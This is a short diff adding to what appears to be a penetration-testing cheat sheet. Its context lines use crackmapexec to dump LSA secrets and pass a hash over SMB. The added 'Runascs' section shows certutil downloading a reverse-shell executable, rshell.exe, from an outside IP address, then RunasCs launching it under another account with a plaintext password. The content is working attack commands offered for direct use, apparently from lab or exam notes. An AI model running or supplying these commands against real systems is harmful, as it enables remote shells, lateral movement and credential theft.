@@ -62,3 +62,14 @@ crackmapexec smb target.txt -u <usernmae> -p <password>  --lsa
 #using hash (. dot means local) 
 crackmapexec smb target.txt -u Administrator -H <hash> -d .
 ```
+## Runascs 
+If creds are found and already logged into the machine then use this command to login as that user. 
+
+```bash
+PS C:\tools> certutil.exe -urlcache -split -f "http://192.168.45.184/rshell.exe" rshell.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+PS C:\tools> .\RunasCs.exe svc_mssql trustno1 "cmd /c c:\tools\rshell.exe"
+````
